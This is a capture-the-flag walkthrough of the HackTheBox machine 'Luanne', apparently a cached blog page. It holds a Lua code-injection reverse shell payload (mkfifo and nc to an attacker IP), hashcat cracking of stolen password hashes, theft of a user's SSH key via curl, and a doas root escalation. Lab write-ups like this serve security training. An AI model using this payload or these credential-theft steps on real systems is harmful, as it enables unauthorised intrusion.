@@ -1,0 +1,207 @@
+I"f'<h1 id="introductionluanne">Introduction@Luanne:~$</h1>
+
+<table>
+  <thead>
+    <tr>
+      <th>Column</th>
+      <th>Details</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Name</td>
+      <td>Luanne</td>
+    </tr>
+    <tr>
+      <td>IP</td>
+      <td>10.10.10.218</td>
+    </tr>
+    <tr>
+      <td>Points</td>
+      <td>20</td>
+    </tr>
+    <tr>
+      <td>Os</td>
+      <td>BSD</td>
+    </tr>
+    <tr>
+      <td>Difficult</td>
+      <td>Easy</td>
+    </tr>
+    <tr>
+      <td>Creator</td>
+      <td><a href="https://www.hackthebox.eu/home/users/profile/159204">polarbearer</a></td>
+    </tr>
+    <tr>
+      <td>Out on</td>
+      <td>28th November 2020</td>
+    </tr>
+  </tbody>
+</table>
+
+<h1 id="summary">Summary:~$</h1>
+
+<ul>
+  <li>Discovering the new host and scanning for open ports.</li>
+  <li>Checking <strong>robots.txt</strong> and enumerating the <code class="language-plaintext highlighter-rouge">directories</code>.</li>
+  <li>Generating a reverse shell in <code class="language-plaintext highlighter-rouge">Lua</code>.</li>
+  <li>Getting a low priviveleged shell, and traversing in every directory.</li>
+  <li><strong>Cracking</strong> hash using <code class="language-plaintext highlighter-rouge">hashcat</code>.</li>
+  <li>Accessing an unexplored port i.e. <code class="language-plaintext highlighter-rouge">3001</code>.</li>
+  <li>Extracting <code class="language-plaintext highlighter-rouge">id_rsa</code> of one of the users : <code class="language-plaintext highlighter-rouge">r.michaels</code> using a crafted <strong>curl</strong> command.</li>
+  <li>Loging into <code class="language-plaintext highlighter-rouge">r.michaels</code> using <strong>ssh</strong> with <strong>id_rsa</strong>.</li>
+  <li>Manually <code class="language-plaintext highlighter-rouge">enumerating</code> and looking for interesting files.</li>
+  <li>Decrypting a file using <code class="language-plaintext highlighter-rouge">netpgp</code> : A tool for decrypting files in BSD.</li>
+  <li><strong>Cracking</strong> another hash using <code class="language-plaintext highlighter-rouge">hashcat</code>.</li>
+  <li><strong>Escalating</strong> privileges as <strong>root</strong> using <code class="language-plaintext highlighter-rouge">doas</code> command in BSD.</li>
+</ul>
+
+<h1 id="starting">Starting:~$</h1>
+
+<h2 id="nmap">Nmap</h2>
+
+<p>I have used <strong>nmapAutomator</strong> , which keeps the scanning fast and reduces effort.<em>(Not recommended in real life scenarios).</em></p>
+
+<p>Dowload link: <a href="https://github.com/21y4d/nmapAutomator">nmapAutomator</a></p>
+
+<hr />
+<p><img src="/assets/img/luanne-hackthebox/xx-alternate-nmapautomator.png" alt="" /></p>
+
+<p>Basically 3 ports are open : <code class="language-plaintext highlighter-rouge">22:ssh</code> <code class="language-plaintext highlighter-rouge">80:http</code> <code class="language-plaintext highlighter-rouge">9001:http-Medusa</code>.</p>
+
+<p>I looked at <strong>port 80</strong> which showed <code class="language-plaintext highlighter-rouge">/weather</code> as one of the directories.</p>
+
+<p>Accessing <code class="language-plaintext highlighter-rouge">http://10.10.10.218</code>.</p>
+
+<hr />
+<p><img src="/assets/img/luanne-hackthebox/latestt-01.png" alt="" /></p>
+
+<p>Accessing <code class="language-plaintext highlighter-rouge">http://10.10.10.218/robots.txt</code>.</p>
+
+<hr />
+<p><img src="/assets/img/luanne-hackthebox/latest-02.png" alt="" /></p>
+
+<p>Accessing <code class="language-plaintext highlighter-rouge">http://10.10.10.218/weather</code>.</p>
+
+<hr />
+<p><img src="/assets/img/luanne-hackthebox/latest-03.png" alt="" /></p>
+
+<p>It shows a <code class="language-plaintext highlighter-rouge">404 error</code> , enumerating directory with <code class="language-plaintext highlighter-rouge">gobuster</code>.</p>
+
+<p><strong>Command used:</strong> <code class="language-plaintext highlighter-rouge">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.218/weather/ -t 100</code></p>
+
+<hr />
+<p><img src="/assets/img/luanne-hackthebox/gobuster.png" alt="" /></p>
+
+<p>I got another directory as <code class="language-plaintext highlighter-rouge">/forecast</code>. Further accessing and providing the parameter as <code class="language-plaintext highlighter-rouge">city</code>.</p>
+
+<hr />
+<p><img src="/assets/img/luanne-hackthebox/latest-04.png" alt="" /></p>
+
+<hr />
+<p><img src="/assets/img/luanne-hackthebox/latest-05.png" alt="" /></p>
+
+<p>Trying to create an <code class="language-plaintext highlighter-rouge">error</code> with which is <code class="language-plaintext highlighter-rouge">%27</code> in URL encode.</p>
+
+<hr />
+<p><img src="/assets/img/luanne-hackthebox/creating-error.png" alt="" /></p>
+
+<p>From the error I got to know that a language called <code class="language-plaintext highlighter-rouge">Lua</code> is being used.</p>
+
+<p>After some research I created a <code class="language-plaintext highlighter-rouge">reverse shell</code>.</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td><strong>Shell Command :</strong> *http://10.10.10.218/weather/forecast?city=London’+os.execute(“rm /tmp/f;mkfifo /tmp/f;cat /tmp/f</td>
+      <td>/bin/sh -i 2&gt;&amp;1</td>
+      <td>nc YOUR-IP 4444 &gt;/tmp/f “)+’*</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>URL encoding the reverse shell payload, sending it and listening on <code class="language-plaintext highlighter-rouge">nc</code>.</p>
+
+<hr />
+<p><img src="/assets/img/luanne-hackthebox/initial-foothold-shell-10.png" alt="" /></p>
+
+<p>I got a shell as <code class="language-plaintext highlighter-rouge">_httpd</code>.</p>
+
+<p>After that, I manually enumerated the files and while accessing <code class="language-plaintext highlighter-rouge">/var/www/</code>, I got a <code class="language-plaintext highlighter-rouge">.htpasswd</code> file.</p>
+
+<hr />
+<p><img src="/assets/img/luanne-hackthebox/webapi-user-12.png" alt="" /></p>
+
+<p>I used <code class="language-plaintext highlighter-rouge">Hashcat</code> to crack the hash.</p>
+
+<p><strong>Hashcat Command:</strong> <em>hashcat -m 500 -a 0 /home/pulkittalwar2611/Desktop/hashes rockyou.txt –force</em>. Where the hash is stored in the file called <code class="language-plaintext highlighter-rouge">hashes</code>.</p>
+
+<hr />
+<p><img src="/assets/img/luanne-hackthebox/hashcat-commad-cracking-14.png" alt="" /> ___</p>
+
+<p>Got the password as <code class="language-plaintext highlighter-rouge">iamthebest</code>. I logged in port 80 but couldn’t find anything there.</p>
+
+<p>Accessing <code class="language-plaintext highlighter-rouge">port 9001</code>, and entering <strong>user:123</strong> as random username:password.</p>
+
+<hr />
+<p><img src="/assets/img/luanne-hackthebox/port-9001-login-access-17.png" alt="" /></p>
+
+<p>Further I checked <code class="language-plaintext highlighter-rouge">http://10.10.10.218:9001/logtail/processes</code>. I found the following:</p>
+
+<hr />
+<p><img src="/assets/img/luanne-hackthebox/logical-process-3001-port.png" alt="" /></p>
+
+<p>To understand in detail, read this : <a href="https://httpd.apache.org/docs/2.4/mod/mod_userdir.html">Userdir</a> and <a href="https://websiteforstudents.com/configure-nginx-userdir-feature-on-ubuntu-16-04-lts-servers/">Userdir-feature</a>.</p>
+
+<p>Getting <code class="language-plaintext highlighter-rouge">id_rsa</code> of the user: <code class="language-plaintext highlighter-rouge">r.michaels</code>.</p>
+
+<p><strong>Command Used:</strong> <em>curl –user webapi_user:iamthebest http://127.0.0.1:3001/~r.michaels/id_rsa</em></p>
+
+<hr />
+<p><img src="/assets/img/luanne-hackthebox/id-rsa-r.michaels-19.png" alt="" /></p>
+
+<p>Proving permissions to <code class="language-plaintext highlighter-rouge">id_rsa</code> as <code class="language-plaintext highlighter-rouge">600</code>. Loging in as <code class="language-plaintext highlighter-rouge">r.michaels</code> using ssh and id_rsa.</p>
+
+<p><strong>Command Used:</strong> <em>chmod 600 id_rsa</em></p>
+
+<p><em>ssh -i id_rsa r.michaels@10.10.10.218</em></p>
+
+<hr />
+<p><img src="/assets/img/luanne-hackthebox/ssh-loggedin-21.png" alt="" /></p>
+
+<p>Got <code class="language-plaintext highlighter-rouge">User Flag</code>.</p>
+
+<hr />
+<p><img src="/assets/img/luanne-hackthebox/user-flag-22.png" alt="" /></p>
+
+<p>Further enumerating manually, I got a <code class="language-plaintext highlighter-rouge">backup file</code> in <code class="language-plaintext highlighter-rouge">/home/r.michaels/backups/</code>. As it was encrypted so I used <code class="language-plaintext highlighter-rouge">netpgp</code> command to decrypt it.</p>
+
+<hr />
+<p><img src="/assets/img/luanne-hackthebox/backups-r.michales-encrypt-23.png" alt="" /></p>
+
+<p><strong>Command Used:</strong> <em>netpgp –decrypt devel_backup-2020-09-16.tar.gz.enc –output=/tmp/output.tar.gz</em></p>
+
+<hr />
+<p><img src="/assets/img/luanne-hackthebox/netpgp-decrypt-output-25.png" alt="" /></p>
+
+<hr />
+<p><img src="/assets/img/luanne-hackthebox/unzip-gunzip-28.png" alt="" /></p>
+
+<p>After accessing <code class="language-plaintext highlighter-rouge">devel-2020-09-16/www/.htpasswd</code>, I got another hash: <em>webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.</em></p>
+
+<p>Again used <code class="language-plaintext highlighter-rouge">Hashcat</code> to crack the hash.</p>
+
+<p><strong>Hashcat Command:</strong> <em>hashcat -m 500 -a 0 /home/pulkittalwar2611/Desktop/hashes rockyou.txt –force</em>. Where the hash is stored in the file called <code class="language-plaintext highlighter-rouge">hashes</code>.</p>
+
+<hr />
+<p><img src="/assets/img/luanne-hackthebox/hash-crack-root-30.png" alt="" /></p>
+
+<p>Got the password as <code class="language-plaintext highlighter-rouge">littlebear</code>.</p>
+
+<p>To upgrage <code class="language-plaintext highlighter-rouge">privileges</code> in BSD, following command is used : <em>doas -u root /bin/sh</em> and then enter the password you got.</p>
+
+<hr />
+<p><img src="/assets/img/luanne-hackthebox/root-31.png" alt="" /></p>
+
+<p>Got <code class="language-plaintext highlighter-rouge">Root Flag</code>.</p>
+:ET
